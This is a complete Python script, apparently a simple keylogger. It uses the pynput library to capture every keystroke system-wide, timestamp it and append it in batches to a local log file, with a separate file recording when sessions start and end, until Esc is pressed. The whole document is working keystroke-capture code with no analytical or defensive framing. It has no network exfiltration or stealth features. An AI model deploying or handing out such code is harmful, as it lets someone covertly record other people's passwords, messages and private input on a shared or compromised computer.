from pynput.keyboard import Key, Listener
from datetime import datetime

# Configuration
LOG_FILE = "keylogger.txt"
LISTENER_FILE = "listener.txt"
BUFFER_SIZE = 10

# Initialize variables
count = 0
keys = []

# Initialize log files with headers
def initialize_files():
    session_start = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a") as f:
        f.write(f"Session started: {session_start}\n")
        f.write("--------------------------------------------------------------------\n")
    with open(LISTENER_FILE, "a") as f:
        f.write(f"Session started: {session_start}\n")

def on_press(key):
    global count, keys
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    keys.append((key, timestamp))
    count += 1
    if count >= BUFFER_SIZE:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        session_end = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LISTENER_FILE, "a") as f:
            f.write(f"Session ended: {session_end}\n")
        return False

def write_file(keys):
    with open(LOG_FILE, "a") as f:
        for key, timestamp in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(f"[{timestamp}] ")
            elif k == "Key.enter":
                f.write(f"[{timestamp}] [ENTER]\n")
            elif k == "Key.backspace":
                f.write(f"[{timestamp}] [BACKSPACE]")
            elif k == "Key.tab":
                f.write(f"[{timestamp}] [TAB]")
            elif k.startswith("Key"):
                f.write(f"[{timestamp}] [{k.replace('Key.', '').upper()}]")
            else:
                f.write(f"[{timestamp}] {k}")

def main():
    initialize_files()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    with open(LOG_FILE, "a") as f:
        f.write("\n--------------------------------------------------------------------\n")

if __name__ == "__main__":
    main()
